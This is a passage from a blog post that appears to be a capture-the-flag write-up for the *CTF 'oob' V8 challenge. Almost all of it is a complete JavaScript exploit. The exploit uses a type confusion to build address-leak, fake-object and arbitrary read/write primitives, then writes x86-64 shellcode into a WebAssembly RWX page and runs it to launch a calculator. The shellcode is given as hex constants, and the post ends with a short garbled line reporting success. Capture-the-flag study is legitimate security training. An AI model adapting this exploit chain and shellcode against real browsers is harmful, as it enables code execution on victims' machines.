class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">addr_f = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read64</span>(addr_f + <span class="number">0x18n</span>);</span><br><span class="line"><span class="keyword">var</span> data_addr = <span class="title function_">read64</span>(shared_info_addr + <span class="number">0x8n</span>);</span><br><span class="line"><span class="keyword">var</span> instance_addr = <span class="title function_">read64</span>(data_addr + <span class="number">0x10n</span>);</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">read64</span>(instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>,    <span class="number">0x62792eb848500101n</span>,    <span class="number">0x431480101626d60n</span>,    <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>,    <span class="number">0x1010101010101b8n</span>,    <span class="number">0x6d606279b8485001n</span>,    <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>,    <span class="number">0x313b68e6894856e6n</span>,    <span class="number">0x101012434810101n</span>,    <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>,    <span class="number">0x894852e201485a08n</span>,    <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> dataview_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(sc_arr.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(dataview_buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(dataview_buffer) + <span class="number">0x20n</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(buf_backing_store_addr, rwx_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc_arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(i * <span class="number">8</span>, <span class="title function_">itof</span>(sc_arr[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
<h4 id="å®Œæ•´-exploit"><a href="#å®Œæ•´-exploit" class="headerlink" title="å®Œæ•´ exploit"></a>å®Œæ•´ exploit</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// type convert</span></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">BigUint64</span> = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> <span class="title class_">BigUint64</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="title class_">BigUint64</span>[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + value.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type confusion</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_arr = [obj];</span><br><span class="line"><span class="keyword">var</span> float64_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_arr_map = obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> float64_arr_map = float64_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">target</span>)&#123;</span><br><span class="line">	obj_arr[<span class="number">0</span>] = target;</span><br><span class="line">	obj_arr.<span class="title function_">oob</span>(float64_arr_map);</span><br><span class="line">	<span class="keyword">let</span> addr = <span class="title function_">ftoi</span>(obj_arr[<span class="number">0</span>]);</span><br><span class="line">	obj_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line">	<span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	float64_arr[<span class="number">0</span>] = <span class="title function_">itof</span>(addr);</span><br><span class="line">	float64_arr.<span class="title function_">oob</span>(obj_arr_map);</span><br><span class="line">	<span class="keyword">let</span> ret_obj = float64_arr[<span class="number">0</span>];</span><br><span class="line">	float64_arr.<span class="title function_">oob</span>(float64_arr_map);</span><br><span class="line">	<span class="keyword">return</span> ret_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_tools = [float64_arr_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="keyword">var</span> arb_tools_addr = <span class="title function_">addressOf</span>(arb_rw_tools);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(addr % <span class="number">2n</span> == <span class="number">0</span>)addr += <span class="number">1n</span>;</span><br><span class="line">	<span class="keyword">let</span> fake_obj = <span class="title function_">fakeObj</span>(arb_tools_addr - <span class="number">0x20n</span>);</span><br><span class="line">	arb_rw_tools[<span class="number">2</span>] = <span class="title function_">itof</span>(addr - <span class="number">0x10n</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoi</span>(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">addr, value</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(addr % <span class="number">2n</span> == <span class="number">0</span>)addr += <span class="number">1n</span>;</span><br><span class="line">	<span class="keyword">let</span> fake_obj = <span class="title function_">fakeObj</span>(arb_tools_addr - <span class="number">0x20n</span>);</span><br><span class="line">	arb_rw_tools[<span class="number">2</span>] = <span class="title function_">itof</span>(addr - <span class="number">0x10n</span>);</span><br><span class="line">	fake_obj[<span class="number">0</span>] = <span class="title function_">itof</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">addr_f = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read64</span>(addr_f + <span class="number">0x18n</span>);</span><br><span class="line"><span class="keyword">var</span> data_addr = <span class="title function_">read64</span>(shared_info_addr + <span class="number">0x8n</span>);</span><br><span class="line"><span class="keyword">var</span> instance_addr = <span class="title function_">read64</span>(data_addr + <span class="number">0x10n</span>);</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">read64</span>(instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>,    <span class="number">0x62792eb848500101n</span>,    <span class="number">0x431480101626d60n</span>,    <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>,    <span class="number">0x1010101010101b8n</span>,    <span class="number">0x6d606279b8485001n</span>,    <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>,    <span class="number">0x313b68e6894856e6n</span>,    <span class="number">0x101012434810101n</span>,    <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>,    <span class="number">0x894852e201485a08n</span>,    <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> dataview_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(sc_arr.<span class="property">length</span> * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(dataview_buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(dataview_buffer) + <span class="number">0x20n</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(buf_backing_store_addr, rwx_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc_arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(i * <span class="number">8</span>, <span class="title function_">itof</span>(sc_arr[i]), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸå½ˆå‡ºè¨ˆç®—æ©Ÿ</p>
<p><img src="/2023/07/13/starctf-oob/result.png"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Terry1234</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Terry1234</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
